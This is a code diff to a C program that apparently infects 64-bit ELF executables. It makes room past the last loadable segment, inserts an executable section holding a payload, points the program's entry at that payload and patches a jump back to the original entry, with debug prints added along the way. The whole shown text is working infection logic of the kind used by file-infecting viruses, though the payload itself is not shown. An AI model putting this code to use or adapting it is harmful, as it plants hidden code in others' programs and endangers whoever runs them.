@@ -136,29 +136,26 @@ int main(int ac, char **av) {
 	}
 
 	// Calculate new section header and data offsets
-	Elf64_Off new_section_offset = last_loadable_phdr->p_offset + last_loadable_phdr->p_memsz;
-	Elf64_Addr new_section_addr = last_loadable_phdr->p_vaddr + last_loadable_phdr->p_memsz;
+	// Elf64_Off new_section_offset = (last_section_in_segment + 1)->sh_offset;
+	Elf64_Off new_section_offset = last_section_in_segment->sh_offset + last_section_in_segment->sh_size;
+	Elf64_Addr new_section_addr = last_section_in_segment->sh_addr + last_section_in_segment->sh_size;
+
+	if (new_section_addr % 16 != 0)
+	{
+		Elf64_Addr add = 16 - (new_section_addr % 16);
+		new_section_addr += add;
+		last_loadable_phdr->p_memsz += add;
+	}
+
+	if (new_section_offset % 16 != 0)
+	{
+		Elf64_Off add = 16 - (new_section_offset % 16);
+		new_section_offset += add;
+		last_loadable_phdr->p_filesz += add;
+	}
 
 	printf("new_section_offset: %#lx\n", new_section_offset);
 	printf("new_section_addr: %#lx\n", new_section_addr);
-
-	printf("p_memsz: %#ld, p_filesz: %ld\n", last_loadable_phdr->p_memsz, last_loadable_phdr->p_filesz);
-	Elf64_Off move_section_off = new_section_offset - (last_section_in_segment + 1)->sh_offset;
-	// Elf64_Addr move_section_addr = new_section_addr - last_loadable_phdr->p_memsz;
-
-	printf("\nmove_section_off: %#lx, %#lx, %#lx\n", move_section_off, new_section_offset + payload_size_p, new_section_offset + payload_size_p + move_section_off);
-
-	// printf("move_section_addr: %#lx\n", move_section_addr);
-
-	// uint64_t size_diff = filesize + payload_size_p + move_section_off;
-	// printf("oldsize: %ld, filesize: %ld\n", new_filesize, size_diff);
-	// if (ftruncate(fd, size_diff) == -1) {
-	//     perror("ftruncate");
-	//     close(fd);
-	//     exit(EXIT_FAILURE);
-	// }
-
-	// map = (uint8_t *)syscall(SYS_mremap, map, new_filesize, size_diff, 1, NULL); // mremap ; flags MREMAP_MAYMOVE = 1
 
 	// leave space for the new section data and copy the payload
 	memmove(map + new_section_offset + payload_size_p, map + new_section_offset, filesize - new_section_offset);
@@ -204,7 +201,7 @@ int main(int ac, char **av) {
 	for (int i = last_section_in_segment_index; i < ehdr->e_shnum; ++i) {
 		printf("==========================\n");
 		printf("old shdrs[%d].sh_offset: %#lx\n", i, shdrs[i].sh_offset);
-		shdrs[i].sh_offset += payload_size_p + move_section_off;
+		shdrs[i].sh_offset += payload_size_p;
 		if (shdrs[i].sh_addr != 0) {
 			shdrs[i].sh_addr += payload_size_p;
 		}
@@ -214,7 +211,7 @@ int main(int ac, char **av) {
 
 	// Create new section header
 	Elf64_Shdr new_shdr = {
-		.sh_name = 0,
+		.sh_name = 5,
 		.sh_type = SHT_PROGBITS,
 		.sh_flags = SHF_ALLOC | SHF_EXECINSTR,
 		.sh_addr = new_section_addr,
@@ -259,11 +256,17 @@ int main(int ac, char **av) {
 	Elf64_Addr last_entry_point = ehdr->e_entry;
 	ehdr->e_entry = new_section_addr;
 	
+	printf("\nlast entry: %d\n", last_entry_point);
+	printf("new entry: %d\n", new_section_addr);
 	// // Calculate the relative jump offset to the old entry point
 	uint64_t jmp_instruction_address = new_section_addr + payload_size_p - FM_PAYLOAD_RTNOFF;
+	printf("jmp_instruction_address: %d\n", jmp_instruction_address);
 	uint64_t next_instruction_address = jmp_instruction_address + 4; // + 4 bytes to go to the address of the instruction after jump
+	printf("next_instruction_address: %d\n", next_instruction_address);
 	int32_t offset = (int32_t)(last_entry_point - next_instruction_address);
 	printf("offset: %d\n", offset);
+	printf("jump to (op + off): %d\n", next_instruction_address + offset);
+	printf("jump to (last + off): %d\n", last_entry_point - offset);
 
 	// // Write the relative jump instruction at the end of the payload
 	memcpy(map + new_section_offset + payload_size_p - FM_PAYLOAD_RTNOFF, &offset, sizeof(offset));
